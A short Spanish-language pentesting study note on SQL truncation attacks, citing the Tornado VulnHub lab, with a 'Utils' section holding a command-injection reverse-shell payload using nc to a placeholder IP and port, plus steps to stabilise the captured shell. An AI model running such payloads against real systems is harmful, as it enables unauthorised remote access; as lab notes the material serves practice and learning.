___
- tags: #owasp #sqli 
___
## SQL Truncation
es una técnica de ataque en la que un atacante intenta **truncar** o cortar una consulta SQL para realizar acciones maliciosas en una **base de datos**.

Un ejemplo común de este tipo de ataque es cuando una aplicación web tiene un campo de entrada que limita la longitud de los datos, como el correo electrónico, y no valida adecuadamente los datos de entrada

___
## Referencia
- [Tornado IA - Vulhub](https://www.vulnhub.com/entry/ia-tornado,639/).


___
## Utils
### Obteniendo RSE
```txt
test; nc -e /bin/bash <ip> <puerto>
```

### Tratamiento de la tty
```shell
# lanza una bash
script /dev/null -c bash

#ctrl + z
^Z

# le indica que este en modo raw y no muestre nada con -echo
# fg -> trae el proceso suspendido al primer plano
stty raw -echo; fg

# reconfigura la terminal
reset xterm

export TERM=xterm
export SHELL=bash

# indica el tamaño en filas y columnas
stty rows 44 columns 184
```
### Proporción de mi ventana
```shell
stty size
```